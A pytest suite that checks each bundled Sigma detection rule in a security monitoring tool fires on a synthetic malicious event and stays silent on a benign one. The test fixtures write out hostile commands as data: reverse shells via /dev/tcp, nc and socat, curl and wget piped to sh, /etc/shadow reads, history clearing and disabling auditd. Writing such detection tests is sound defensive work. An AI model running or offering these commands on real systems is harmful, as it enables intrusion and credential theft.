"""Every bundled Sigma rule against a matching and a non-matching event.

Each case feeds a *raw* source event (a syslog line, a webhook JSON object, a
Wazuh alert, a Zeek log entry or a Suricata EVE record) through the real
normalizer and then through a SigmaEngine loaded with all bundled rules.  A
rule file without a case fails ``test_every_bundled_rule_has_a_case``.
"""

from __future__ import annotations

from pathlib import Path
from typing import Any

import pytest
import yaml

from app.connectors.syslog_receiver import parse_syslog
from app.engine.sigma_engine import TACTIC_NAME_TO_ID, SigmaEngine
from app.services.normalizers.field_mapping import FieldMappingConfig
from app.services.normalizers.ocsf import OCSFEvent
from app.services.normalizers.suricata import SuricataNormalizer
from app.services.normalizers.syslog import SyslogNormalizer
from app.services.normalizers.wazuh import WazuhNormalizer
from app.services.normalizers.webhook import WebhookNormalizer
from app.services.normalizers.zeek import ZeekNormalizer

SIGMA_RULES_DIR = Path(__file__).parent.parent.parent / "sigma_rules"
RULE_FILES = sorted(SIGMA_RULES_DIR.glob("*.yml"))

VALID_LEVELS = {"informational", "low", "medium", "high", "critical"}


# ── Raw event builders (one per supported source) ────────────────────────────

def syslog(line: str) -> OCSFEvent:
    return SyslogNormalizer().normalize(parse_syslog(line, ("10.0.0.7", 51400)))


def sudo(command: str) -> OCSFEvent:
    return syslog(
        "<85>Feb 19 08:31:00 web01 sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; "
        f"USER=root ; COMMAND={command}"
    )


def webhook(**fields: Any) -> OCSFEvent:
    return WebhookNormalizer().normalize(
        {"_webhook_source": "custom-source", "host": "web01", **fields}
    )


def wazuh_windows(groups: list[str], **eventdata: Any) -> dict[str, Any]:
    return {
        "timestamp": "2026-02-19T08:30:00.000+0000",
        "id": "1708331400.12345",
        "rule": {"id": "61603", "level": 5, "description": "Sysmon event", "groups": groups},
        "agent": {
            "id": "001",
            "name": "WIN-DC01",
            "ip": "10.0.0.10",
            "os": {"name": "Microsoft Windows Server 2019"},
        },
        "data": {"win": {"eventdata": eventdata}},
    }


def windows_process(command_line: str, image: str) -> OCSFEvent:
    return WazuhNormalizer().normalize(
        wazuh_windows(["sysmon", "win_process"], commandLine=command_line, image=image)
    )


def windows_network(image: str, destination_port: int) -> OCSFEvent:
    """Sysmon network connection.  The Wazuh normalizer does not map the
    destination port by default; the connector's field mapping supplies it."""
    raw = wazuh_windows(
        ["sysmon", "network_connection"], image=image, destinationPort=destination_port
    )
    mapping = FieldMappingConfig.from_config(
        {"dst_endpoint.port": "data.win.eventdata.destinationPort"}
    )
    return mapping.apply(WazuhNormalizer().normalize(raw), raw)


def zeek_dns(query: str) -> OCSFEvent:
    return ZeekNormalizer().normalize({
        "_log_type": "dns", "ts": 1771489800.0, "uid": "CAbc1",
        "id.orig_h": "10.0.0.21", "id.orig_p": 53211,
        "id.resp_h": "10.0.0.2", "id.resp_p": 53,
        "query": query, "qtype_name": "A",
    })


def suricata_dns(query: str) -> OCSFEvent:
    return SuricataNormalizer().normalize({
        "timestamp": "2026-02-19T08:30:00.123456+0000", "event_type": "dns",
        "src_ip": "10.0.0.21", "src_port": 53211, "dest_ip": "10.0.0.2", "dest_port": 53,
        "dns": {"type": "query", "rrname": query, "rrtype": "A"},
    })


def zeek_http(user_agent: str) -> OCSFEvent:
    return ZeekNormalizer().normalize({
        "_log_type": "http", "ts": 1771489800.0, "uid": "CAbc2",
        "id.orig_h": "10.0.0.21", "id.orig_p": 40112,
        "id.resp_h": "198.51.100.7", "id.resp_p": 80,
        "method": "GET", "host": "198.51.100.7", "uri": "/u.sh", "user_agent": user_agent,
    })


def suricata_alert(signature: str) -> OCSFEvent:
    return SuricataNormalizer().normalize({
        "timestamp": "2026-02-19T08:30:00.123456+0000", "event_type": "alert",
        "src_ip": "10.0.0.21", "src_port": 40112, "dest_ip": "198.51.100.7", "dest_port": 443,
        "proto": "TCP",
        "alert": {"signature_id": 2030358, "signature": signature, "severity": 1},
    })


SSH = "<38>Feb 19 08:30:00 web01 sshd[2211]: "
PS = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"

# rule file stem → (events that must match, events that must not match)
CASES: dict[str, tuple[list[OCSFEvent], list[OCSFEvent]]] = {
    "linux_ssh_failed_password_root": (
        [syslog(SSH + "Failed password for root from 203.0.113.5 port 51122 ssh2")],
        [syslog(SSH + "Failed password for alice from 203.0.113.5 port 51122 ssh2")],
    ),
    "linux_ssh_root_login_accepted": (
        [syslog(SSH + "Accepted publickey for root from 10.0.0.4 port 40022 ssh2")],
        [syslog(SSH + "Accepted publickey for deploy from 10.0.0.4 port 40022 ssh2")],
    ),
    "linux_sudo_shadow_file_access": (
        [sudo("/usr/bin/cat /etc/shadow"), webhook(command_line="cp /etc/shadow /tmp/s")],
        [sudo("/usr/bin/cat /etc/hostname"), sudo("/usr/sbin/vipw -s /etc/shadow")],
    ),
    "linux_sudo_authentication_failure": (
        [
            syslog(
                "<85>Feb 19 08:31:00 web01 sudo: pam_unix(sudo:auth): authentication failure; "
                "logname=alice uid=1000 euid=0 tty=/dev/pts/0 ruser=alice rhost=  user=alice"
            ),
            syslog(
                "<85>Feb 19 08:31:00 web01 sudo:    bob : user NOT in sudoers ; TTY=pts/1 ; "
                "PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/id"
            ),
        ],
        [sudo("/usr/bin/id")],
    ),
    "linux_local_account_created": (
        [syslog(
            "<86>Feb 19 08:32:00 web01 useradd[3120]: new user: name=svc_backup, UID=1001, "
            "GID=1001, home=/home/svc_backup, shell=/bin/bash"
        )],
        [syslog("<86>Feb 19 08:32:00 web01 useradd[3120]: new group: name=svc_backup, GID=1001")],
    ),
    "linux_user_added_to_privileged_group": (
        [syslog("<86>Feb 19 08:33:00 web01 usermod[3150]: add 'svc_backup' to group 'sudo'")],
        [syslog("<86>Feb 19 08:33:00 web01 usermod[3150]: add 'svc_backup' to group 'printers'")],
    ),
    "linux_cron_download_and_execute": (
        [syslog(
            "<78>Feb 19 08:35:01 web01 CRON[4100]: (root) CMD (curl -fsSL http://198.51.100.7/u.sh | sh)"
        )],
        [syslog("<78>Feb 19 08:35:01 web01 CRON[4100]: (root) CMD (/usr/lib/sysstat/sa1 1 1)")],
    ),
    "linux_shell_history_cleared": (
        [sudo("/usr/bin/rm /root/.bash_history"), webhook(command_line="history -c")],
        [sudo("/usr/bin/tail /root/.bash_history"), webhook(command_line="history | tail")],
    ),
    "linux_reverse_shell_command": (
        [
            webhook(command_line="bash -c 'bash -i >& /dev/tcp/198.51.100.7/4444 0>&1'"),
            webhook(command_line="nc -e /bin/sh 198.51.100.7 4444"),
            webhook(command_line="socat tcp:198.51.100.7:4444 exec:/bin/sh,pty"),
        ],
        [webhook(command_line="nc -zv db01 5432"), webhook(command_line="bash -c 'echo ok'")],
    ),
    "linux_download_piped_to_shell": (
        [
            webhook(command_line="curl -fsSL https://198.51.100.7/install.sh | bash"),
            sudo("/usr/bin/sh -c wget -qO- http://198.51.100.7/i.sh | sh"),
        ],
        [webhook(command_line="curl -o /tmp/file.tar.gz https://example.org/file.tar.gz")],
    ),
    "linux_ssh_authorized_keys_modified": (
        [sudo("/usr/bin/tee -a /root/.ssh/authorized_keys")],
        [sudo("/usr/bin/cat /root/.ssh/authorized_keys")],
    ),
    "linux_audit_logging_stopped": (
        [sudo("/usr/bin/systemctl stop auditd"), sudo("/usr/sbin/auditctl -e 0")],
        [sudo("/usr/bin/systemctl status auditd")],
    ),
    "suricata_c2_framework_signature": (
        [suricata_alert("ET MALWARE CobaltStrike Beacon Activity")],
        [suricata_alert("ET POLICY curl User-Agent Outbound")],
    ),
    "zeek_http_scripting_tool_user_agent": (
        [
            zeek_http("curl/8.5.0"),
            zeek_http("Mozilla/5.0 (Windows NT; Windows NT 10.0) WindowsPowerShell/5.1.19041"),
        ],
        [zeek_http("Mozilla/5.0 (X11; Linux x86_64) Firefox/128.0"), zeek_dns("example.org")],
    ),
    "dns_public_ip_lookup_service": (
        [zeek_dns("api.ipify.org"), suricata_dns("ifconfig.me")],
        [zeek_dns("www.example.org")],
    ),
    "dns_tunneling_long_query": (
        [zeek_dns("a" * 60 + ".tunnel.example.org")],
        [zeek_dns("www.example.org")],
    ),
    "powershell_encoded_command": (
        [windows_process("powershell.exe -enc SQBFAFgA", PS)],
        [windows_process("powershell.exe Get-Date", PS)],
    ),
    "lsass_memory_access": (
        [windows_process(r"C:\Windows\System32\lsass.exe", r"C:\Windows\System32\lsass.exe")],
        [windows_process("notepad.exe", r"C:\Windows\System32\notepad.exe")],
    ),
    "new_service_creation": (
        [windows_process(r"sc create updater binPath= C:\Users\Public\u.exe", r"C:\Windows\System32\sc.exe")],
        [windows_process("sc query", r"C:\Windows\System32\sc.exe")],
    ),
    "lateral_movement_smb": (
        [windows_network(r"C:\Tools\PsExec.exe", 445)],
        [windows_network(r"C:\Tools\PsExec.exe", 443), windows_network(r"C:\Windows\explorer.exe", 445)],
    ),
}


@pytest.fixture(scope="module")
def engine() -> SigmaEngine:
    """Engine with every bundled rule, keyed by rule id."""
    sigma_engine = SigmaEngine()
    for path in RULE_FILES:
        sigma_engine.add_rule(sigma_engine.parse_rule_yaml(path.read_text(encoding="utf-8")))
    return sigma_engine


def _rule_id(stem: str) -> str:
    return yaml.safe_load((SIGMA_RULES_DIR / f"{stem}.yml").read_text(encoding="utf-8"))["id"]


async def _fired_rule_ids(engine: SigmaEngine, event: OCSFEvent) -> set[str]:
    return {alert.rule_id async for alert in engine.evaluate(event)}


def test_every_bundled_rule_has_a_case() -> None:
    assert {path.stem for path in RULE_FILES} == set(CASES)


def test_bundled_rule_count() -> None:
    assert 15 <= len(RULE_FILES) <= 25


@pytest.mark.parametrize("stem", sorted(CASES))
async def test_rule_fires_on_matching_event(engine: SigmaEngine, stem: str) -> None:
    for event in CASES[stem][0]:
        assert _rule_id(stem) in await _fired_rule_ids(engine, event), event.unmapped or event.process


@pytest.mark.parametrize("stem", sorted(CASES))
async def test_rule_silent_on_non_matching_event(engine: SigmaEngine, stem: str) -> None:
    for event in CASES[stem][1]:
        assert _rule_id(stem) not in await _fired_rule_ids(engine, event), event.unmapped or event.process


@pytest.mark.parametrize("path", RULE_FILES, ids=lambda p: p.stem)
def test_rule_metadata_is_complete(path: Path) -> None:
    """id, level, logsource, false positives, and technique + tactic tags."""
    doc = yaml.safe_load(path.read_text(encoding="utf-8"))
    rule = SigmaEngine().parse_rule_yaml(path.read_text(encoding="utf-8"))

    assert doc.get("id") and doc.get("title") and doc.get("description")
    assert rule.level in VALID_LEVELS
    assert rule.logsource, "a bundled rule must name a logsource"
    assert doc.get("falsepositives"), "a bundled rule must list false positives"
    assert rule.technique_ids, "a bundled rule must carry an attack.tNNNN tag"
    assert rule.tactic_ids, "a bundled rule must carry a tactic tag"
    assert set(rule.tactic_ids) <= set(TACTIC_NAME_TO_ID.values())


def test_rule_ids_are_unique() -> None:
    ids = [yaml.safe_load(p.read_text(encoding="utf-8"))["id"] for p in RULE_FILES]
    assert len(ids) == len(set(ids))


def test_rule_files_use_lf_line_endings() -> None:
    assert not [p.name for p in RULE_FILES if b"\r" in p.read_bytes()]
